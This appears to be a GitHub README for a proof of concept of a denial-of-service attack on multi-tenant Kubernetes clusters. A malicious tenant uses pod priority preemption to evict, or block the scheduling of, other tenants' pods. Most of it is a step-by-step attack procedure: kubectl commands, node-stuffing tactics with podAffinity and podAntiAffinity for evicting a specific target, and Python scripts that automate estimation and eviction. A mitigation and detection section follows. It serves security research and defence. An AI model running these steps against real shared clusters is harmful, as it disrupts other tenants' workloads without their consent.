# Pod Denial-of-Service using Pod Priority preemption

## TL;DR

* The issue concerns **multi-tenant** kubernetes cluster
* **Default kubernetes configuration** is affected
* A malicous tenant can create a pod that **could preempt any pod on the cluster**

The aim is to demonstate how we could perform the Denial-of-Service of another pod in the same kubernetes cluster using `PodPriority`.

By DoS we mean:
**Pod eviction, if the target pod is already running** and **Block pod rescheduling**

|Impact|Complexity|
|----|----|
|DoS of other tenant application|Easy/Intermediate|

<div align=center>
  <h3><a href="#%EF%B8%8F-demo">>> Demo 🖥️ <<</a></h3>
</div>


- [📚 Theory](#-theory)
- [🔫 PoC](#-poc)
  - [💥 Simple eviction](#-simple-eviction)
  - [👨🏽‍🦯 Blind DoS](#-blind-dos)
  - [🎯 Evict a specific Pod](#-evict-a-specific-pod)
  - [🧙‍♂️ Automate a bit](#-automate-a-bit)
- [🚧 Limits](#-limits)
- [🛡 Protection & Mitigation](#-protection--mitigation)
- [📖 Cheat Sheet](#-cheat-sheet)
- [👀 Additional Resources](#-additional-resources)



## 📚 Theory
*➲ Let's go back to school..*

### Resource Quota

When several users or teams share a cluster with a fixed number of nodes, there is a concern that one team could use more than its fair share of resources ***~>*** **Resource Quotas**: limit aggregate resource consumption per namespace: quantity of objects + compute resources that may be consumed

| Property                                                     |
| :------------------------------------------------------------ |
| Resource Quota does not applied to already created resources |

* **Object Count Quota**: restrict the number of any namespaced resource. example: restrict pod number to 2:

  ```yaml
  apiVersion: v1
  kind: ResourceQuota
  metadata:
    name: pods-quota
    namespace: toto
  spec:
    hard:
      pods: 2
  ```




| Property                                                     |
| :------------------------------------------------------------ |
| If quota is enabled in a  namespace for compute resources like cpu and memory, users must specify  requests or limits for those values |

**Request *vs* Limit:**  A request is the amount of resource garuanteed by Kubernetes for the container. Conversaly, a limit for a resource is the maximum amount of a resource that Kubernetes will allow to the container use

#### Recommanded use

* 1 ns per team
* Admin creates 1 ResourQuota for each ns
* Users create resources (pods, services, etc.) in the namespace, and the quota system tracks usage to ensure it does not exceed hard resource limits defined in a ResourceQuota.

### Pod Priority and Preemption

**Pod priority**: If a Pod cannot be scheduled, the scheduler tries to preempt (evict) lower priority Pods to make scheduling of the pending Pod possible.

When a pod with priority is in pending mode, the scheduler searches node with lower priority pod and if the eviciton of this pod make the higher priority pod scheduling possible  ⇒ Lower pod evicted + higher pod scheduled. 

#### How to use `PodPriority`?

1. Add one or more [PriorityClasses](https://kubernetes.io/docs/concepts/scheduling-eviction/pod-priority-preemption/#priorityclass).
2. Create Pods with[`priorityClassName`](https://kubernetes.io/docs/concepts/scheduling-eviction/pod-priority-preemption/#pod-priority) 

That's all! Note that all previous created pods are set with the default Priority (which is `0`)

#### Test eviction and schedule blocking

| Property                                                     |
| :----------------------------------------------------------- |
| It supports **eviction decisions based on incompressible resources**.<br>Eviction doesn’t happen if pressure is on compressible resources, e.g., CPU.|

**Notes:** This property only apply to kubelet eviction. CPU resource can actually be used to perform Out-Of-Resource cluster state and thus launching eviction process for higher-priority pod creation.

| Property                                                     |
| :----------------------------------------------------------- |
| **In the case of memory pressure:** <br><ul> <li>Pods are sorted first based on whether  their memory usage exceeds their request or not, then by pod priority,  and then by consumption of memory relative to memory requests</li><li> Pods that don’t exceed memory requests are not evicted. A lower priority pod that doesn’t exceed memory requests will not be evicted </li></ul>|

***(❓) Could we evict already running pod by creating pod with higher priority ?***

> Yes !  [see](https://kubernetes.io/docs/concepts/scheduling-eviction/_print/#preemption)

***(❓) Could we block pod scheduling by running higher priority pod ?***

> Yes ! With the same mechanism. If we have a running higher-priority pod that a specif resource supply is exhausted, all lower-priority pods won't be scheduled till the resource supply is not sufficient [see](https://kubernetes.io/docs/concepts/scheduling-eviction/_print/#effect-of-pod-priority-on-scheduling-order) 

***(❓) Is this attack is inter-namespace feasable ?***

> Yes ! Higher-priority pod can evict pod of another namespace

***(❓) To trigger Out-of-Resource state, we need to exhaust the resource supply of the cluster ?***

> No, we need to exhaust the supply of a specific node ([see](https://kubernetes.io/docs/tasks/configure-pod-container/assign-cpu-resource/#specify-a-cpu-request-that-is-too-big-for-your-nodes)), **BUT** if the cluster resource supply isn't exhausted and you don't specify the node you want to exhaust, the malicious Pod will be scheduled on a node with adequat supply w/o evicting any pod.

This imply that an attacker can **voluntary restrict the zone to deploy higher-priority malicious pods to a single node to trigger the premption process.** Indeed, it is easier to stuff a single node than a whole cluster.

However, preempted pods would be rescheduled on other node if they have the right.

***(❓) Can we change `priorityClass` of pods?*** without having right to directly modify them

> No ! You can't change `priorityClass` of running pods **BUT** you can change the priorityClass of future pods (with `globalDefault` field, priorityClass manipulation, etc...).
>
> In general, it is recommended not to grant any rights to users on `priorityClass` if they are not admin to not have priorityClass change for pods.


## 🔫 PoC
*➲ Here we are!*

<div align=center>
  <h3><a href="#%EF%B8%8F-demo">>> Demo 🖥️ <<</a></h3>
</div>

### 💥 Simple eviction

We will put our cluster in **Out-Of-Resource state using `cpu`oversupply**

Use your cluster or create one with 3 nodes and cpu limit at `4`:

```shell
minikube start --cpus 4 --nodes 4
```

  In fact, `--cpus 4` seems to be useless. It is the value of `capacity.cpu` find with `kubectl get nodes -o=jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.status.capacity.cpu}{"\n"}{end}'` that has importance (here `4`)

1. Create low-priority pods (ie pods without priorityClass  ⇒ priority `0`).With a daemonSet to be sure to have one on each node: `kubectl apply -f simple/ds-no-pod-priority.yml`

   At this point, you must have 3 pods running, 1 on each nodes. Each nodes uses ~3 cpu.

2. Create pod with high priority:`kubectl apply -f simple/pod-high.yml`. The key is it musts have `cpu` requests so that:
   * Total cpu requested of all pods is greater than the total amount of cpu available for each nodes ⇒ exhaust the supply of CPU
   * cpu request is not greater than maximum node cpu ⇒ Making the pod scheduling possible (if lower-priority pod is evicted)

See that this will evict a low-priority pod (`Pending` status) and start `high-priority`pod.

   
### 👨🏽‍🦯 Blind DoS

In a multi-tenant cluster, you probably not have access to:
* cpu limit
* information about other pods running in another namespace
* etc ...

To be able to determine which amount of cpu request will trigger an eviction you have to fumble around to get an idea of the cluster state. Indeed, be able to run a high-priority pod does not guarantee us if another pod on another namespace has been evicted or not.

So, the goal is to trigger an out-of-bound resource with lower pod to estimate the amount to request. It lays on the assumption that the cluster is relatively stable (not many pod creation/deletion happen in a minute).

#### Set-up

1. Create cluster with 3 nodes and cpu.limit to 4, create `bad-tenant` namespace & create the `high-priority `Priority Class:
   * `minikube start --cpus 4 --nodes 3`
   * `kubectl create ns bad-tenant`
   * `kubectl apply -f priorityClass-high.yml`
2. Populate the cluster with lower-priority pods (to simulate other tenants activities): `kubectl apply -f ds/ds-no-pod-priority.yml` 
3. Watch pods on both namespaces:
   * `watch -n 0.1 -d kubectl get pods -o wide`
   * `watch -n 0.1 -d kubectl get pods -o wide -n bad-tenant`

#### Attack

As the tenant, we could only deploy pod in our namespace `bad-tenant`.

1. Create a deployment of lower-priority pod: `kubectl apply -f blind/deployment-estimate-no-priority.yml`

2. See that the pod of the deployment was succesfully created and is running. Now increase progressively the deployment replicas value: 

   * `kubectl -n bad-tenant scale deployment/estimate  --replicas=2`
   * `kubectl -n bad-tenant scale deployment/estimate  --replicas=3`, and so on...

3. When we reach `7` replicas, we observe that the new pod is `Pending` ⇒ We have stuffed our cluster and it is likely out of cpu resource (check with `kubectl describe pod [pending_estimate_pod] -n bad-tenant`). Hence, if we create the same deployment with high-priority it will evict some pods on other ns.

   * delete your low-priority deployment: `kubectl delete -f blind/deployment-estimate-no-priority.yml`
   * create the high-priority deployment & scale it to have 7 replicas: `kubectl apply -f blind/deployment-high.yml && kubectl -n bad-tenant scale deployment/high-priority-evictor  --replicas=7`

See that you actually have evicted a pod on `default` namespace!

##### Alternative

To easily see on which node the eviction occurs, you can set the replicas to `6` and create an higher-priority pod: the eviction occurs on the same node of this pod.

`kubectl apply -f blind/deployment-high.yml && kubectl -n bad-tenant scale deployment/high-priority-evictor  --replicas=6 && kubectl apply -f blind/pod-high.yml`


### 🎯 Evict a specific Pod

Basically you can't choose the pod you will evict **BUT** you could evict all lower-priority pods including your specific target.

To do this you need to stuff the node where your target pod is. 2 approaches:
* You already know the node where the target pod is running
* You know one label of the target pod

#### Case 1 - Node stuffing and `PodAffinity`

*> Assuming we know on which node the target pod is scheduled.*

##### Set-up

For the PoC we will create a DaemonSet on the `default` namespace of a 5-nodes cluster (our target pod is one of these pods). Then we create a malicious higher-priority pod in another namespace that will trigger the eviction of this specific pod.

1. create the cluster, populate `default` ns, create priorityClass, create `bad-tenant`namespace:
   * `minikube start --cpus 4 --nodes 5`
   * `kubectl create ns bad-tenant`
   * `kubectl apply -f priorityClass-high.yml`
   * `kubectl apply -f ds/ds-no-pod-priority.yml`
2. Watch pods on both namespaces:
   * `watch -n 0.1 -d kubectl get pods -o wide`
   * `watch -n 0.1 -d kubectl get pods -o wide -n bad-tenant`

##### Attack

Assuming our target is on node `minikube-m02`. Our aim is know to stuff this specific node. To do so:
1. Schedule a pod (`scout`) on this node with a specific label (force sheduling with `pod.spec.nodeName`): `kubectl apply -f target/scout.yml`
2. Create the deployment to stuff the node, to do so add `podAffinity` to your deployment's pod with the `scout` pod: `kubectl apply -f target/deployment-high-affinity.yml`
3. Scale the deployment progressively till you evict a Pod on `default` ns: `kubectl -n bad-tenant scale deployment.apps/deployment-high-affinity  --replicas=2`

You have evicted the target pod on `minikube-m02`!

*Notes:*
* Why not using `nodeName` for the deployment instead of podaffinity? Cause when you specify `nodeName`, the scheduling process is not hte same and the preemption does not occur (`OutOfCpu` status for your higher-priority pods instead)
* In a more realistic scenario you wouldn't see where the eviction happen. To see a  more realistic approach: [Blind PoC](#-blind-dos)


#### Case 2 - Cluster stuffing and `AntiPodAffinity`

*> Assuming we know label of the target pod*

##### Set-up

For the PoC we will create pods on the `default` namespace of a 3-nodes cluster (including our target). Then we create a malicious higher-priority pod in another namespace that will trigger the eviction of this specific pod.

The set-up process in nearly the same as the one of the blind DoS section.

1. create the cluster, populate `default` ns, create priorityClass, create `bad-tenant`namespace:
   * `minikube start --cpus 4 --nodes 3`
   * `kubectl create ns bad-tenant`
   * `kubectl apply -f priorityClass-high.yml`
   * `kubectl apply -f ds/ds-no-pod-priority.yml`
2. Create the target pod (no priorityClass + specific label): `kubectl apply -f target/target-pod.yml`
3. Determine the number of higher-priority pods to create to stuff nodes (see [Blind DoS](#-Blind-DoS)). Create consequently deployment of higher-priority pods with the adequat `replica` value: `kubectl apply -f target/deployment-high.yml && kubectl -n bad-tenant scale deployment/deployment-high-priority  --replicas=5`
4. Watch pods on both namespaces:
   * `watch -n 0.1 -d kubectl get pods -o wide`
   * `watch -n 0.1 -d kubectl get pods -o wide -n bad-tenant`

##### Attack

Now we have a cluster with stuffed nodes. We want to evict `target` pod of another tenant within another namespace. We have succeed to obtain specific labels of the target pod. We are going to use them with `podAntiffinity`. We will instruct kubernetes to schedule our higher-priority pod on a node where the `target` pod is not.

As all the node are stuffed and can't schedule the higher-priority pod  without reaching a cpu Out-Of-Resource the anti-affinity can't be respected. The `podAntiAffinity` will then force the scheduling of the higher-priority pod where the target pod is, triggering its eviction.

1. Create the high-priority pod: `kubectl apply -f target/pod-high.yml`

(see [limits](#limits) to have more details)


### 🧙‍ Automate a bit
before running all scripts:
```
pip install kubernetes
```

To find **how many replicas you need to create to stuff the cluster** and thus being near a Cluster Out-of-Cpu state:
```shell
python3  estimate-cpu-supply.py -n bad-tenant --cpu 1 --increment 1 --replicas 2 --timeout 10 
```
It will output the number of replica needed for this purpose.

Now we want to **perform eviction**: stuff cluster + create evictor/preemptor-pod:
```shell
python3 evict.py -n bad-tenant --cpu 1 --replicas 5
```

And if you like one-liner, **estimate how to stuff the cluster & evict right after**:
```shell
python3 evict.py --replicas $(python3 estimate-cpu-supply.py && sleep 10)
```

## 🚧 Limits

* If you reach the `ResourceQuota` you could not create the malicious pod (it won't be place in pending mode, so not in scheduling queue). So  the attack is not doable.
* In the case of memory pressure, **pods are sorted first based on whether  their memory usage exceeds their request or not**, then by pod priority,  and then by consumption of memory relative to memory requests
* `OutOfCPu` can occurs for higher-priority pod (especially from `deployment`) even if lower-priority pods are running. It is because the **named node** where you higher-priority pods specify the scheduling  does not have the resources to accommodate the pod => pod fail. **This is why you can't specify a `pod.spec.nodeName` in your malicious pod to evict pod of a specific node.**
  * This not apply to `pod.spec.nodeSelector`, `pod.spec.affinity.nodeAffinity` ,  `pod.spec.affinity.podAffinity` and `pod.spec.affinity.podAntiAffinity` (as it does not named a node). You can use them to perform lower-priority pod eviction on targeted node.
  * Nethertheless, you can't use `pod.spec.affinity.podAffinity` with affinity with a pod you aim to evict => high-priority pod will stay pending. [see](https://kubernetes.io/docs/concepts/scheduling-eviction/pod-priority-preemption/#inter-pod-affinity-on-lower-priority-pods)
  * With `pod.spec.affinity.podAntiAffinity` use  `preferredDuringSchedulingIgnoredDuringExecution`

## 🛡 Protection & Mitigation

* Put `ResourceQuota` on each namespaces to limit resource use. Check that the addition of the wholes limits & requests within aren't higher than the overall of the cluster resources
  * In addition, enforce specification of pod resources
  * launch an alert based on limit and requests (if no limit are supplied in resourcequota, resource requests is too big, etc...)
* Allow `ResourceQuota`, `priorityClass` use only for admin users (generally the same for all cluster-wide resources)
* Add rules via admission controller to prevent specific use of higher PriorityClasses (e.g. disallow `system-node-critical` for non-admin ns)
* Create Non-preempting PriorityClass (with `preemptionPolicy: Never`) to block preemption by higher priority pods ***~>*** higher-priority pods are placed in the scheduling queue ahead of lower-priority pods, but they cannot preempt other pods. This comes w/ a downside: pods with lower priority could be scheduled before them ([see](https://kubernetes.io/docs/concepts/scheduling-eviction/pod-priority-preemption/#non-preempting-priority-class))



## 📖 Cheat Sheet

* Watch `FailedScheduling` or `Prempted` event to detect cpu starvation and eviction : `kubectl -n bad-tenant get events --sort-by='.metadata.creationTimestamp' -A --watch | grep -E "FailedScheduling|Preempted" --color`
* Get clusters resources available: `kubectl top nodes` *(need  the right to list resource "nodes" in API group "metrics.k8s.io" at the cluster scope + metric-server deployed)*
  * enable metric-server w/ minikube: `minikube addons enable metrics-server`
  * otherwise use `kubectl get nodes -o=jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.status.capacity.cpu}{"\n"}{end}'`
* Get pod priority classes: `kubectl get PriorityClass`
* `cpu` usage
  * stats on container cpu usage (%): `docker stats [container_name]`
  * docker cpu limit: (in container) `cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us`divided by `cat /sys/fs/cgroup/cpu/cpu.cfs_period_us` give us the limit number of cpu allocated for the container
  * `kubectl describe nodes [node_name]`
* Watch pod changement in namespace: `watch -d -n 0.1 -t kubectl get pods -o wide`
* Scale a deployment: `kubectl scale deployment/[name]  --replicas=3`

## 👀 Additional Resources

* [Resource Quota](https://kubernetes.io/docs/concepts/policy/resource-quotas/)
* [Pod priority preemption](https://kubernetes.io/docs/concepts/scheduling-eviction/pod-priority-preemption/#pod-priority)
* [Kubernetes - Pods are prempted but the preemptor is not scheduled](https://kubernetes.io/docs/concepts/scheduling-eviction/_print/#pods-are-preempted-but-the-preemptor-is-not-scheduled)
* [Preemption order](https://github.com/kubernetes/design-proposals-archive/blob/main/scheduling/pod-preemption.md#preemption-order)
* [Article on Pod Priority](https://blog.wescale.fr/2019/01/29/k8s-preemption-et-priorites-de-pods/)
* [Article on Pod Priority & Pod eviction](https://medium.com/container-talks/ultimate-guide-of-pod-eviction-on-kubernetes-588d7f6de8dd)

## 🖥️ Demo

<div align=center>
  <img src="https://github.com/ariary/kube-podpreemption-DoS/blob/main/demo/eviction.gif">
</div>


## To Do
* try with other resource than cpu
